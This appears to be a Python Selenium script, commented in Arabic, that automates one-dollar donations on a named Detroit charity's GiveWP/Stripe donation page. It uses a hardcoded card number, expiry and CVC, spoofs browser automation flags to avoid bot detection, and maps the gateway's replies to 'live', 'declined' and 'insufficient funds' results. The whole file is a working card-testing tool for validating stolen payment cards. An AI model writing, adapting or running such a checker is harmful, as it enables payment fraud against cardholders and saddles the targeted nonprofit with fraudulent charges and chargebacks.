import time
import re
import json
import random
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class GiveWPStripeSeleniumChecker:
    """فحص GiveWP + Stripe باستخدام Selenium + Stripe.js"""
    
    def __init__(self, url, headless=True):
        self.url = url
        self.headless = headless
        self.driver = None
        
        # Card
        self.card_number = "5104040287872188"
        self.exp_month = "12"
        self.exp_year = "2027"
        self.cvc = "951"
        self.first_name = "James"
        self.last_name = "Smith"
        self.email = f"james{random.randint(100, 999)}@gmail.com"
        
        # Form
        self.form_id = None
        self.form_hash = None
        self.form_prefix = None
        self.stripe_key = None
        self.pm_id = None
        
        # Session for POST
        self.session = requests.Session()
        self.session.verify = False
    
    def setup_driver(self):
        """إعداد Chrome"""
        try:
            options = Options()
            
            if self.headless:
                options.add_argument('--headless=new')
            
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-setuid-sandbox')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            
            options.add_argument(
                'user-agent=Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
            )
            
            # Try system chromedriver first
            try:
                from selenium.webdriver.chrome.service import Service
                import os
                if os.path.exists('/usr/bin/chromedriver'):
                    service = Service('/usr/bin/chromedriver')
                    options.binary_location = '/usr/bin/chromium'
                    self.driver = webdriver.Chrome(service=service, options=options)
                else:
                    try:
                        from webdriver_manager.chrome import ChromeDriverManager
                        service = Service(ChromeDriverManager().install())
                        self.driver = webdriver.Chrome(service=service, options=options)
                    except:
                        self.driver = webdriver.Chrome(options=options)
            except:
                self.driver = webdriver.Chrome(options=options)
            
            # Hide webdriver
            self.driver.execute_script(
                "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
            )
            
            return True
        except Exception as e:
            print(f"❌ Driver setup error: {e}")
            return False
    
    def step1_open_page(self):
        """افتح الصفحة"""
        print("🌐 Step 1: Opening page...")
        
        try:
            self.driver.get(self.url)
            time.sleep(5)
            
            # استخراج Form Data من الصفحة
            html = self.driver.page_source
            
            # Form ID
            form_id_el = self.driver.find_elements(By.NAME, "give-form-id")
            if form_id_el:
                self.form_id = form_id_el[0].get_attribute("value")
            
            # Form Hash
            form_hash_el = self.driver.find_elements(By.NAME, "give-form-hash")
            if form_hash_el:
                self.form_hash = form_hash_el[0].get_attribute("value")
            
            # Form Prefix
            form_prefix_el = self.driver.find_elements(By.NAME, "give-form-id-prefix")
            if form_prefix_el:
                self.form_prefix = form_prefix_el[0].get_attribute("value")
            
            # Stripe Key
            stripe_key_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
            if stripe_key_match:
                self.stripe_key = stripe_key_match.group(0)
            
            print(f"✅ Form ID: {self.form_id}")
            print(f"✅ Form Hash: {self.form_hash}")
            print(f"✅ Form Prefix: {self.form_prefix}")
            print(f"✅ Stripe Key: {self.stripe_key}")
            
            if not self.form_id or not self.form_hash:
                return "MISSING_FORM_DATA"
            
            return "OK"
        except Exception as e:
            return f"Open Error: {str(e)[:100]}"
    
    def step2_load_stripe_js(self):
        """حمّل Stripe.js وولّد pm_xxx"""
        print("💳 Step 2: Loading Stripe.js and generating PM...")
        
        if not self.stripe_key:
            return "NO_STRIPE_KEY"
        
        # ننتظر تحميل Stripe.js
        time.sleep(3)
        
        # كود JavaScript لتوليد Payment Method
        js_code = """
        return (async () => {
            try {
                // لو Stripe مش محمل، حمله
                if (typeof Stripe === 'undefined') {
                    await new Promise((resolve, reject) => {
                        const script = document.createElement('script');
                        script.src = 'https://js.stripe.com/v3/';
                        script.onload = resolve;
                        script.onerror = reject;
                        document.head.appendChild(script);
                    });
                    await new Promise(r => setTimeout(r, 1000));
                }
                
                if (typeof Stripe === 'undefined') {
                    return JSON.stringify({error: 'Stripe.js failed to load'});
                }
                
                // Stripe Key
                const stripeKey = arguments[0];
                const stripe = Stripe(stripeKey);
                
                // Card data
                const cardData = {
                    number: arguments[1],
                    exp_month: parseInt(arguments[2]),
                    exp_year: parseInt(arguments[3]),
                    cvc: arguments[4],
                };
                
                const billing = {
                    name: arguments[5],
                    email: arguments[6],
                    address: {
                        line1: '123 Main Street',
                        city: 'New York',
                        state: 'NY',
                        postal_code: '10001',
                        country: 'US',
                    }
                };
                
                // Generate PM
                const result = await stripe.createPaymentMethod({
                    type: 'card',
                    card: cardData,
                    billing_details: billing,
                });
                
                if (result.error) {
                    return JSON.stringify({
                        error: result.error.message,
                        code: result.error.code,
                        decline_code: result.error.decline_code,
                    });
                }
                
                return JSON.stringify({
                    pm_id: result.paymentMethod.id,
                    success: true
                });
                
            } catch (e) {
                return JSON.stringify({error: 'Exception: ' + e.message});
            }
        })();
        """
        
        try:
            result_raw = self.driver.execute_async_script("""
                var callback = arguments[arguments.length - 1];
                var stripeKey = arguments[0];
                var cardNum = arguments[1];
                var expM = arguments[2];
                var expY = arguments[3];
                var cvc = arguments[4];
                var name = arguments[5];
                var email = arguments[6];
                
                (async () => {
                    try {
                        if (typeof Stripe === 'undefined') {
                            await new Promise((resolve, reject) => {
                                const s = document.createElement('script');
                                s.src = 'https://js.stripe.com/v3/';
                                s.onload = resolve;
                                s.onerror = reject;
                                document.head.appendChild(s);
                            });
                            await new Promise(r => setTimeout(r, 1500));
                        }
                        
                        if (typeof Stripe === 'undefined') {
                            callback(JSON.stringify({error: 'Stripe.js failed to load'}));
                            return;
                        }
                        
                        const stripe = Stripe(stripeKey);
                        
                        const result = await stripe.createPaymentMethod({
                            type: 'card',
                            card: {
                                number: cardNum,
                                exp_month: parseInt(expM),
                                exp_year: parseInt(expY),
                                cvc: cvc,
                            },
                            billing_details: {
                                name: name,
                                email: email,
                                address: {
                                    line1: '123 Main Street',
                                    city: 'New York',
                                    state: 'NY',
                                    postal_code: '10001',
                                    country: 'US',
                                }
                            }
                        });
                        
                        if (result.error) {
                            callback(JSON.stringify({
                                error: result.error.message,
                                code: result.error.code,
                                decline_code: result.error.decline_code,
                            }));
                        } else {
                            callback(JSON.stringify({
                                pm_id: result.paymentMethod.id,
                                success: true
                            }));
                        }
                    } catch (e) {
                        callback(JSON.stringify({error: 'Exception: ' + e.message}));
                    }
                })();
            """, self.stripe_key, self.card_number, self.exp_month, self.exp_year, self.cvc, f"{self.first_name} {self.last_name}", self.email)
            
            print(f"📥 Stripe.js raw response: {result_raw[:300]}")
            
            data = json.loads(result_raw)
            
            if 'error' in data:
                error = data['error']
                code = data.get('code', '')
                decline = data.get('decline_code', '')
                
                # تحديد نوع الخطأ
                if decline:
                    return f"STRIPE_{decline.upper()}"
                if code:
                    return f"STRIPE_{code.upper()}"
                return f"STRIPE_{error[:80]}"
            
            if 'pm_id' in data:
                self.pm_id = data['pm_id']
                print(f"✅ Generated PM: {self.pm_id}")
                return "OK"
            
            return "UNKNOWN_STRIPE_RESPONSE"
            
        except Exception as e:
            return f"Stripe.js Error: {str(e)[:100]}"
    
    def step3_get_cookies(self):
        """جيب الـ cookies من Selenium"""
        cookies = self.driver.get_cookies()
        for cookie in cookies:
            self.session.cookies.set(cookie['name'], cookie['value'])
        
        # جيب User-Agent
        ua = self.driver.execute_script("return navigator.userAgent")
        print(f"✅ Got {len(cookies)} cookies, UA: {ua[:50]}...")
    
    def step4_submit_donation(self):
        """أرسل POST للتبرع"""
        print("💸 Step 4: Submitting donation...")
        
        donation_url = f'https://higherhopesdetroit.org/donation/?payment-mode=stripe&form-id={self.form_id}'
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': self.form_prefix or f'{self.form_id}-1',
            'give-form-id': self.form_id,
            'give-form-title': 'Give a Donation',
            'give-current-url': 'https://higherhopesdetroit.org/donation/',
            'give-form-url': 'https://higherhopesdetroit.org/donation/',
            'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': self.form_hash,
            'give-price-id': 'custom',
            'give-amount': '1.00',
            'give_tributes_type': 'In Honor Of',
            'give_tributes_show_dedication': 'no',
            'give_tributes_radio_type': 'In Honor Of',
            'give_tributes_first_name': '',
            'give_tributes_last_name': '',
            'give_stripe_payment_method': self.pm_id,
            'payment-mode': 'stripe',
            'give_first': self.first_name,
            'give_last': self.last_name,
            'give_email': self.email,
            'give_comment': 'Donation',
            'card_name': f'{self.first_name} {self.last_name}',
            'billing_country': 'US',
            'card_address': '123 Main Street',
            'card_address_2': '',
            'card_city': 'New York',
            'card_state': 'NY',
            'card_zip': '10001',
            'give_action': 'purchase',
            'give-gateway': 'stripe',
        }
        
        headers = {
            'authority': 'higherhopesdetroit.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://higherhopesdetroit.org',
            'referer': 'https://higherhopesdetroit.org/donation/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        try:
            response = self.session.post(
                donation_url,
                data=data,
                headers=headers,
                timeout=30
            )
            
            print(f"📥 Response: {response.status_code}, len={len(response.text)}")
            
            return self.parse_response(response.text, response.status_code)
            
        except Exception as e:
            return f"POST Error: {str(e)[:100]}"
    
    def parse_response(self, text, status_code):
        """تحليل الرد"""
        text_lower = text.lower()
        
        # Live responses
        live_map = {
            'insufficient': 'INSUFFICIENT_FUNDS',
            'your card has insufficient funds': 'INSUFFICIENT_FUNDS',
            'insufficient_funds': 'INSUFFICIENT_FUNDS',
            'declined': 'DECLINED',
            'card was declined': 'DECLINED',
            'your card was declined': 'DECLINED',
            'expired': 'EXPIRED_CARD',
            'card has expired': 'EXPIRED_CARD',
            'suspected fraud': 'SUSPECTED_FRAUD',
            'fraudulent': 'SUSPECTED_FRAUD',
            'security code is incorrect': 'CVV_FAILURE',
            'card number is incorrect': 'INVALID_CARD_NUMBER',
            'not supported': 'CARD_NOT_SUPPORTED',
            'do not honor': 'DO_NOT_HONOR',
            'thank you': 'CHARGE 1.0',
            'success': 'CHARGE 1.0',
        }
        
        for kw, resp in live_map.items():
            if kw in text_lower:
                return resp
        
        # JSON
        if text.strip().startswith('{'):
            try:
                data = json.loads(text)
                if isinstance(data, dict):
                    if data.get('success'):
                        return 'CHARGE 1.0'
                    if 'data' in data and isinstance(data['data'], dict):
                        inner = data['data']
                        if 'error' in inner:
                            return f"GATEWAY: {inner['error'][:100]}"
                        if 'message' in inner:
                            return f"MSG: {inner['message'][:100]}"
            except:
                pass
        
        # Search in HTML
        match = re.search(r'"error[^"]*"\s*:\s*"([^"]+)"', text)
        if match:
            return f"ERROR: {match.group(1)[:100]}"
        
        match = re.search(r'(error[:\s]+[^<\n]{5,150})', text_lower)
        if match:
            return f"ERROR: {match.group(1)[:100]}"
        
        # Default
        if status_code == 200:
            # نشوف لو فيه بيانات رد
            return f"UNKNOWN_200: {text[:150].strip()}"
        else:
            return f"HTTP_{status_code}"
    
    def close(self):
        """إغلاق المتصفح"""
        try:
            if self.driver:
                self.driver.quit()
        except:
            pass
    
    def run(self):
        """الوظيفة الرئيسية"""
        print("=" * 60)
        print(f"🎯 Checking: {self.url}")
        print("=" * 60)
        
        # Setup
        if not self.setup_driver():
            return "Driver Setup Failed"
        
        try:
            # Step 1: Open
            result = self.step1_open_page()
            if result != "OK":
                self.close()
                return result
            
            # Step 2: Stripe.js → pm_xxx
            result = self.step2_load_stripe_js()
            if result != "OK":
                self.close()
                return result
            
            # Step 3: Get cookies
            self.step3_get_cookies()
            
            # Step 4: POST
            result = self.step4_submit_donation()
            
            self.close()
            return result
        
        except Exception as e:
            self.close()
            return f"Error: {str(e)[:100]}"


# ═══════════════════════════════════════════════════════════
# Run
# ═══════════════════════════════════════════════════════════

if __name__ == '__main__':
    url = 'https://higherhopesdetroit.org/donation/'
    
    checker = GiveWPStripeSeleniumChecker(url, headless=True)
    result = checker.run()
    
    print("=" * 60)
    print(f"📊 RESULT: {result}")
    print("=" * 60)
